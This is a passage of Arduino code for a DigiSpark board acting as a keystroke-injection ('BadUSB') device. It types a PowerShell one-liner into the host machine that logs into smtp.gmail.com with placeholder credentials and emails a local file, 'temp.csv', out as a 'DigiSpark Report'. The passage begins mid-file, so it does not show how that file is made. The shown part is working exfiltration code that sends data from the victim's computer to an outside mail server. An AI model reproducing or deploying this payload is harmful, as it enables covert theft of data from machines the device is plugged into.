...
//  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient(\"smtp.gmail.com\", 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(\"xxx\", \"xxx\"); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = \"xxx\"; $ReportEmail.To.Add(\"xxx\"); $ReportEmail.Subject = \"DigiSpark Report\"; $ReportEmail.Body = \"Attached is your report. - Regards Your Digispark\"; $ReportEmail.Attachments.Add(\"temp.csv\"); $SMTPInfo.Send($ReportEmail);"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
//  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
//  DigiKeyboard.delay(500);
